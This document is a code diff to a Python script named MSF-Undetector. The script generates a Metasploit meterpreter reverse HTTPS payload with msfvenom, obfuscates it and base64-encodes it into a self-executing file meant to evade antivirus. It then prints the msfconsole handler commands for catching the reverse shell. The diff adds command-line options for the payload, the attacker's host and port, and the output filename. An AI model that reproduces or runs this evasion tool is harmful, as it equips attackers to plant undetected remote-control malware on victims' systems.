@@ -1,14 +1,20 @@
 #!/usr/bin/python
+import os, re, base64, random, argparse
 
-import os, re, base64, random
+print '=' * 45
+print '[ MSF-Undetector - http://github.com/kkar ]'
+print '=' * 45
 
-#Getting the payload parameters
-consoleIP = raw_input('IP Address [LHOST]: ')
-consolePort = raw_input('Local Port [LPORT]: ')
-msfpayload = 'python/meterpreter_reverse_https' #Using stageless meterpreter, reverse HTTPS (bigger in size and no stages)
+#Getting the arguments
+parser = argparse.ArgumentParser()
+parser.add_argument("-p", "--payload", help="chose your payload (Default: python/meterpreter_reverse_https)", default="python/meterpreter_reverse_https")
+parser.add_argument("-a", "--address", required=True, help="IP/Hostname of metasploit console")
+parser.add_argument("-l", "--lport", required=True, help="msf console listening port")
+parser.add_argument("-o", "--output", help="obfuscated filename (Default: output.py)", default="output.py")
+args = parser.parse_args()
 
 #Storing the msfvenom output in a temp variable
-tmp = os.popen('msfvenom -p %s LHOST=%s LPORT=%s R' % (msfpayload, consoleIP, consolePort)).read()
+tmp = os.popen('msfvenom -p %s LHOST=%s LPORT=%s R' % (args.payload, args.address, args.lport)).read()
 
 #Storing only the payload to a variable and decoding it to another
 firstbase64 = re.findall(r"'(.*?)'", tmp, re.DOTALL)[1]
@@ -39,16 +45,17 @@ obfuscated_result = "exec("+Obfuscate(decoded)+")"
 encoded = base64.encodestring(obfuscated_result)
 
 #Opening the result script file
-output = open('output.py', "w")
+output = open(args.output, "w")
 
 #Writing the obfuscated version to the result script file
 output.write("import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('" + encoded.replace('\n', '').replace('\r', '') + "')))")
 
-print "Done! Run msfconsole with the following commands."
+print "Payload obfuscated and saved as: %s" % args.output
+print "Run msfconsole with the following commands."
 print "-" * 20
 print "use exploit/multi/handler"
-print "set PAYLOAD %s" % msfpayload
-print "set LPORT %s" % consolePort
+print "set PAYLOAD %s" % args.payload
+print "set LPORT %s" % args.lport
 print "set LHOST 0.0.0.0"
 print "SessionExpirationTimeout 0"
 print "SessionCommunicationTimeout 0"
